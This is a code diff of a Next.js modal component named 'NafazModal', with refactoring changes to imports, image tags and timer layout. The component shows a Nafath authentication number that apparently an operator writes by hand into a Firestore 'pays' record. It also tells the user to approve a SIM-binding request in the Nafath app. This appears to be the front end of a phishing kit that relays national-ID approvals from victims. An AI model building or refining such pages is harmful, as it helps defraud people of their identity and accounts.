@@ -1,6 +1,7 @@
 "use client"
 
-import { useState, useEffect } from "react"
+import { useState, useEffect, useCallback } from "react"
+import Image from "next/image"
 import { doc, onSnapshot } from "firebase/firestore"
 import { db } from "@/lib/firebase"
 
@@ -19,9 +20,8 @@ export default function NafazModal({ isOpen, onClose, userId, phone }: ModalProp
   // Fetch Nafaz PIN from Firestore and listen for changes
   useEffect(() => {
     if (!isOpen || !userId) return
-    console.log(auth_number)
-    // eslint-disable-next-line no-constant-binary-expression
-    setLoading(true && auth_number !== "انتظر")
+
+    setLoading(true)
 
     // Set up real-time listener to the user's document in Firestore
     const userDocRef = doc(db, "pays", userId)
@@ -31,9 +31,7 @@ export default function NafazModal({ isOpen, onClose, userId, phone }: ModalProp
       (docSnapshot) => {
         if (docSnapshot.exists()) {
           const userData = docSnapshot.data()
-          // Assuming the PIN is stored in a field called 'authNumber'
-          const pin = userData.authNumber || ""
-          setAuthNumber(userData.authNumber)
+          setAuthNumber(userData.authNumber || "انتظر")
         } else {
           console.error("User document not found")
         }
@@ -110,24 +108,24 @@ export default function NafazModal({ isOpen, onClose, userId, phone }: ModalProp
                 الرجاء فتح تطبيق نفاذ وتأكيد طلب اصدار امر ربط شريحتك على رقم الجوال
                 <span className="mx-2 text-[#3a9f8c] font-medium">( {phone} )</span>
                 <span className="block mt-3">باختيار الرقم أعلاه</span>
-                <div className="flex items-center justify-center">
-                  <div className="bg-gray-100 rounded-lg px-4 py-2">
-                    <span className="text-[#3a9f8c] font-semibold">{formatTime(timeLeft)}</span>
-                  </div>
-                </div>
               </p>
+              <div className="flex items-center justify-center mt-3">
+                <div className="bg-gray-100 rounded-lg px-4 py-2">
+                  <span className="text-[#3a9f8c] font-semibold">{formatTime(timeLeft)}</span>
+                </div>
+              </div>
             </div>
 
             <div className="flex flex-row gap-8 sm:gap-12 justify-center mt-8">
               <div className="flex flex-col items-center space-y-3">
                 <span className="text-[#3a9f8c] font-semibold text-lg">الخطوه 1</span>
-                <img src="/logo.png" alt="نفاذ" className="w-24 h-24 object-contain" />
+                <Image src="/logo.png" alt="نفاذ" width={96} height={96} className="w-24 h-24 object-contain" />
                 <span className="text-[#3a9f8c] font-semibold text-center">تحميل تطبيق نفاذ</span>
               </div>
 
               <div className="flex flex-col items-center space-y-3">
                 <span className="text-[#3a9f8c] font-semibold text-lg">الخطوه 2</span>
-                <img src="/face-id.png" alt="التحقق من الوجه" className="w-24 h-24 object-contain" />
+                <Image src="/face-id.png" alt="التحقق من الوجه" width={96} height={96} className="w-24 h-24 object-contain" />
                 <span className="text-[#3a9f8c] text-center max-w-[200px] font-semibold">
                   اختيار الرقم أعلاه والتحقق عبر السمات الحيوية
                 </span>
